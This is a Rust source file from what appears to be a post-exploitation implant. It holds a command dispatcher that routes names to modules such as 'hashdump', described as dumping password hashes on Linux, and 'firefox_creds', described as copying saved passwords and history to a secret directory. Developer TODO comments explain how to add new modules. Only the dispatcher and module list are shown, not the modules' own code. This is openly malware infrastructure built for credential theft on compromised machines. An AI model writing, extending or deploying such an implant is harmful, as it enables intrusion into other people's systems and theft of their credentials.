// Custom Module System
// Description: A system that allows users to write their own custom
//              post-exploit modules.


/*** DEV TODO ***/
// Add your module here in the format
// mod module_name;
mod example;
mod password_dump;
mod sys_info;
mod firefox_creds;
// takes in a &str (the name of the module), runs that module, and then
// returns the output of the module as a vector of bytes.
pub fn dispatch(s: String) -> Vec<u8> {

    let mut s_trimmed = String::from_utf8_lossy(&remove_null(&mut s.as_bytes().to_vec())).as_ref().to_string();
    let result = match s_trimmed.as_str() {

        /*** DEV TODO ***/
        // add a match statement for your module below in the format
        // "module_name" => module_name::run(),
        "example" => example::run(),
        "hashdump" => password_dump::run(),
        "sys_info" => sys_info::run(),
        "firefox_creds" => firefox_creds::run(),
        &_ => format!("MODULE NOT FOUND: {s_trimmed}\n").to_string(),
    };
    return result.as_bytes().to_vec();
}


// prints to the screen a list of all installed modules
pub fn list_mods() {
    println!("Installed Modules:");

    /*** DEV TODO ***/
    // add a print statement below for your module in the following format:
    // println!("module_name - description of what the module does");
    println!("example - a template for developers to write their own modules");
    println!("hashdump - dumps hashes from common places on linux systems");
    println!("sys_info - prints out system information");
    println!("firefox_creds - copies passwords/history files to secret dir");
}

// fixes bug where bagillion null bytes sadge :(
pub fn remove_null(s: &mut Vec<u8>) -> Vec<u8> {
    let mut frnt = s.pop().expect("Error: Vec Empty");
    while frnt == 0 {
        frnt = s.pop().expect("Error: Vec Empty");
    }
    s.push(frnt);
    return s.to_vec();
}
